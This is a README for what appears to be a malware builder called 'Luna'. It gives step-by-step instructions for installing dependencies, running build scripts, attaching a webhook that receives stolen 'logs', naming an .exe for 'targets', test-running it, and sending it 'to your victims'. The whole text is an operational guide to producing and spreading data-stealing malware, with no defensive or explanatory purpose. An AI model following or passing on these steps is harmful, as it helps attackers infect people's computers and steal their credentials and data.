## 🐍・ Download Python

Make sure you have [Python](https://www.python.org/downloads/) installed!
```sh-session
python v3.10.1 or higher
```

### 1. Download The Files:
```
Once you've downloaded the files extract the folder so it's no longer a .zip file.
```
### 2. Open The installer.bat File:
```
You dont need to install any modules opening this will install them for you. Then you can open the build.bat which will 
open a terminal with the luna logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
```
### 3. Create A Webhook:
```
This webhook will be sent the logs you obtain so dont remove it. Once you've created one paste it 
into the terminal when prompted.
```
### 4. Enter The File Name:
```
Now you can make up a name for the file that you will send to targets. This can be changed later 
once the .exe has been created.
```
### 5. Test The File:
``` 
You will then be promtped as to whether you want to run the file or not. I reccomend this so you 
can see if there are any issues or not.
```
### 6. What Now?
``` 
The .exe file will appear with the name you set it as in the folder you downloaded and you can now send 
this to your victims.😈
```

### 7. GUI
